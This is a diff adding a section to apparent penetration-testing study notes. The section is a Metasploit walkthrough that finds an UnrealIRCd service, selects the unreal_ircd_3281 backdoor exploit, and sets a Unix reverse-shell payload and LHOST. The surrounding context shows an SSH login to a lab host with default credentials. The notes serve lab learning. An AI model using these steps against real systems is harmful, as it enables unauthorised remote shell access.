@@ -203,3 +203,16 @@ from that we can note the Id of the session from the Id column and use the follo
 since we got the uername, password of the SSH we can use the normal of accessing it as follows:
 > ssh <username>@<ip_addr> (after initalization, asks for password )
 eg: ssh msfadmin@192.168.1.98
+
+[VIDEO (Unreal IRCd backdoor Command Execution(CE)]
+here after nmap -sV we get the info UnrealIRCd running in 6667
+search for the following:
+> searchsploit unrealircd (a BCE exploit in metasploit is found)
+search in msfc:
+> search unrealircd (one result shown same as in searchsploit)
+select it by entering "use 0"(since that's the only exploit shown i.e. exploit/unix/irc/unreal_ircd_3281_backdoor)
+set all options and default payload wont be setup so use the following:
+> set payload [PRESS_TAB] (shows all possible shell payloads), eg:
+> set payload /cmd/unix/reverse
+since we've selected reverse shell we set the ip for LHOST
+then 'exploit'
